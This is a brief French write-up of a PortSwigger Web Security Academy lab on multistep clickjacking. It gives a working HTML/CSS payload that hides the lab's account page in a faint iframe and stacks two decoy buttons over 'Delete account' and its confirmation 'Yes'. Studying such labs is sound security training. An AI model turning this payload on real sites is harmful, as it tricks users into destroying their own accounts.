# Lab

https://portswigger.net/web-security/clickjacking/lab-multistep

## Solution

Pour ce lab, il faut cliquer sur deux boutons dans un ordre précis pour supprimer le compte de l'utilisateur.

Il faut faire un iframe avec une opacité de 0.2 pour que l'utilisateur ne le voit pas. Ensuite, il faut placer deux boutons sur l'iframe. Le premier bouton doit être placé sur le bouton `Delete account` et le deuxième bouton doit être placé sur le bouton `Yes`.

En ajustant la position des deux `div` et en ajustant la taille de l'iframe, on peut arriver à un résultat comme celui-ci:

```html
<style>
	iframe {
		position:relative;
		width:800px;
		height: 800px;
		opacity: 0.2;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a7e007b03f693678007a940004800fa.web-security-academy.net/my-account"></iframe>
```